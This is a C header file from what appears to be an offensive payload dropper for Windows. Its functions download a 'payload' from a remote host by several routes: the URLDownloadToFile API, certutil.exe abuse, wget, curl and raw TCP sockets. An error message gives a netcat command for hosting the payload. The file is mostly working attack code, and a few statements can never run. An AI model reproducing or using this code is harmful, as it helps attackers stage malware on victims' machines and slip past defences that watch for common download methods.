#ifndef DOWNLOAD_H
#define DOWNLOAD_H

#include <wininet.h>
#include <winsock2.h>
#include <windows.h>
#include "helper.h"

typedef struct _DOWNLOAD_CONTEXT {
    char *ip;
    int ipLen;
    int port;
    char *sourceUrl;
    int sourceUrlLen;
    char *targetPath;
    int targetPathLen;
} DOWNLOAD_CONTEXT, *PDOWNLOAD_CONTEXT;

BOOL DownloadUsingWin32(const PDOWNLOAD_CONTEXT pDc) {
    printf("[*] Downloading the payload using Win32 API\n");
    printf("[*] Target path: %s\n", pDc->targetPath);
    HRESULT hResult = URLDownloadToFile(
        NULL,
        pDc->sourceUrl,
        pDc->targetPath,
        0, NULL
    );

    if (hResult != S_OK) {
        switch(hResult) {
            case INET_E_RESOURCE_NOT_FOUND:
                fprintf(stderr, "[-] No internet connection.\n");
                break;
            case INET_E_INVALID_URL:
                fprintf(stderr, "[-] Invalid URL.\n");
                break;
            case INET_E_DOWNLOAD_FAILURE:
                fprintf(stderr, "[-] Cannot write to destination path.\n");
                break;
            default:
                fprintf(stderr, "[-] Unknown error. HRESULT: 0x%08lX\n", hResult);
                break;
        }
        return FALSE;
    }

    return TRUE;
}

BOOL DownloadUsingCertutil(const PDOWNLOAD_CONTEXT pDc) {
    char certutilPath[MAX_PATH + 1];
    int certutilPathLen = LocateBinary(certutilPath, "certutil.exe", MAX_PATH);
    if (!certutilPathLen) {
        return FALSE;
    }

    printf("[*] Downloading the payload using certutil.exe\n");
    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
    snprintf(command, sizeof(command), "%s -urlcache -split -f %s %s", certutilPath, pDc->sourceUrl, pDc->targetPath);
    return ExecuteCommand(command);
}

BOOL DownloadUsingWget(const PDOWNLOAD_CONTEXT pDc) {
    char wgetPath[MAX_PATH + 1];
    int wgetPathLen = LocateBinary(wgetPath, "wget.exe", MAX_PATH);
    if (!wgetPathLen) {
        return FALSE;
    }

    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
    snprintf(command, sizeof(command), "%s -O %s %s", wgetPath, pDc->targetPath, pDc->sourceUrl);
    return ExecuteCommand(command);
    printf("[*] Downloading the payload using wget\n");
}

BOOL DownloadUsingCurl(const PDOWNLOAD_CONTEXT pDc) {
    char curlPath[MAX_PATH + 1];
    int curlPathLen = LocateBinary(curlPath, "curl.exe", MAX_PATH);
    if (!curlPathLen) {
        return FALSE;
    }

    char command[pDc->sourceUrlLen + pDc->targetPathLen + MAX_PATH + 64];
    snprintf(command, sizeof(command), "%s -o %s %s", curlPath, pDc->targetPath, pDc->sourceUrl);
    return ExecuteCommand(command);
    printf("[*] Downloading the payload using curl\n");
}

BOOL DownloadUsingTCPSocket(const PDOWNLOAD_CONTEXT pDc) {
    printf("[*] Downloading the payload using raw TCP sockets\n");
    
    WSADATA wsa;
    struct sockaddr_in serverAddr;
    char buffer[4096];
    int bufferSize = sizeof(buffer);
    int received;
    long long totalReceived = 0;
    FILE* f;
    char errMsg[1024];

    WSAStartup(MAKEWORD(2, 2), &wsa);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        return FALSE;
    }

    serverAddr.sin_addr.s_addr = inet_addr(pDc->ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(pDc->port);
     
    if (connect(clientSocket, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        TranslateErrorPrint(WSAGetLastError());
        snprintf(errMsg, sizeof(errMsg), "Connection failed to %s:%d.\n[!] Make sure to host your payload with the following command\n\t$ nc -nlvp <PORT> -q 1< <PAYLOAD>\n", pDc->ip, pDc->port);
        TranslateErrorPrintStr(errMsg);
        return FALSE;
    }

    f = fopen(pDc->targetPath, "wb");
    if (!f) {
        closesocket(clientSocket);
        snprintf(errMsg, sizeof(errMsg), "Failed to open %s\n", pDc->targetPath);
        TranslateErrorPrintStr(errMsg);
        return FALSE;
    }

    while ((received = recv(clientSocket, buffer, bufferSize, 0)) > 0) {
        fwrite(buffer, 1, received, f);
        totalReceived += received;
    }
    
    printf("[+] Successfully received %lu bytes of data\n", totalReceived);
    fclose(f);
    closesocket(clientSocket);
    WSACleanup();
    return TRUE;
}

#endif // DOWNLOAD_H
